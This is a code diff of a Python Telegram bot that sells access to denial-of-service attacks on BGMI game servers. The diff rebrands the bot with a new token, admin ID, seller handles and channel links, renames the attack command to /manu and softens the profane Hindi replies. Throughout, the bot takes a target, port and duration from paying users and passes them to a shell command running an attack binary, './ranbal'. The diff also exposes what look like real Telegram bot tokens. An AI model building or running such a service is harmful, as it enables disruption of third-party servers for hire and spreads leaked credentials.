@@ -5,10 +5,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7687115306:AAHNnycsXRAtVbpZ6__Ytx2nSwIbH1PJjZc')
+bot = telebot.TeleBot('7919319817:AAFAZOkc3BCptK3DtgGQo_awFG8pIbfj5pA')
 
 # Admin user IDs
-admin_id = {"7083378335", "1291795330"}
+admin_id = {"7083378335", "1436507974"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -148,7 +148,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @Baap_hu_ter4."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @MANUHACKSOWNER."
 
     bot.reply_to(message , response)
 
@@ -184,7 +184,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "Purchase karle bsdk:- @Baap_hu_ter4 ."
+        response = "Purchase karle bsdk:- @MANUHACKSOWNER ."
 
     bot.reply_to(message, response)
     
@@ -263,7 +263,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"CHUDAI start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahe Dalna Bhenchod"
+    response = f"ATTACK start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahi Dalna"
     bot.reply_to(message, response)
 
     # Dictionary to store the last time each user ran the /chodo command
@@ -274,14 +274,14 @@ COOLDOWN_TIME =0
 attack_running = False
 
 # Handler for /attack command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['manu'])
 def handle_attack(message):
     global attack_running
 
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         if attack_running:
-            response = "Abhi Chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
+            response = "Abhi attack chal rha ha wait karo voo attack khatam hoga then tumhara attack laga ga."
             bot.reply_to(message, response)
             return
 
@@ -296,7 +296,7 @@ def handle_attack(message):
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    record_command_logs(user_id, '/manu', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
 
@@ -304,15 +304,15 @@ def handle_attack(message):
                     full_command = f"./ranbal {target} {port} {time} 800"
                     subprocess.run(full_command, shell=True)
 
-                    response = "Chudai completed successfully."
+                    response = "Attack completed successfully."
                 except Exception as e:
                     response = f"Error during attack: {str(e)}"
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /bgmi <target> <port> <time>"
+            response = "Usage: /manu <target> <port> <time>"
     else:
-        response = "ACCESS TOH LELE LAURE FREE mai kuch nahi milega FREE mai shrif mere LUND milega lega toh bata ."
+        response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."
 
     bot.reply_to(message, response)
 
@@ -335,7 +335,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "Pehle Buy krke Aao Bhenkelode ❌ ."
+        response = "Pehle Buy krke Aao ❌ ."
 
     bot.reply_to(message, response)
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /bgmi : 😫BGMI WALO KI MAA KO CHODO🥵. 
+💥 /manu : 😫BGMI WALO KE SERVER KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
@@ -352,8 +352,8 @@ def show_help(message):
 👀 To See Admin Commands:
 🤖 /admincmd : Shows All Admin Commands.
 
-Buy From :- @Baap_hu_ter4
-Official Channel :- https://t.me/samcheat0p
+Buy From :- @MANUHACKSOWNER
+Official Channel :- https://t.me/+MrbmWtUWyMlhZTJl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -368,9 +368,9 @@ Official Channel :- https://t.me/samcheat0p
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''SERVER ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
+    response = f'''SERVER HACK pe aapka swagat hai, {user_name}! Sabse acche se bgmi ke server yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
 🤗Try To Run This Command : /help 
-💵BUY :- @Baap_hu_ter4'''
+💵BUY :- @MANUHACKSOWNER'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -380,14 +380,14 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/samcheat0p OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/+MrbmWtUWyMlhZTJl OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Ye plan hi kafi hai bgmi ki ma chodne ke liye!!:
+    response = f'''{user_name}, Ye plan hi kafi hai bgmi ke server ke liye!!:
 
 Vip  :
 -> Attack Time :  (S)
@@ -436,7 +436,7 @@ def broadcast_message(message):
         else:
             response = " Please Provide A Message To Broadcast."
     else:
-        response = "BhenChod Owner na HAI TU LODE."
+        response = "Owner na ho tum."
 
     bot.reply_to(message, response)
 
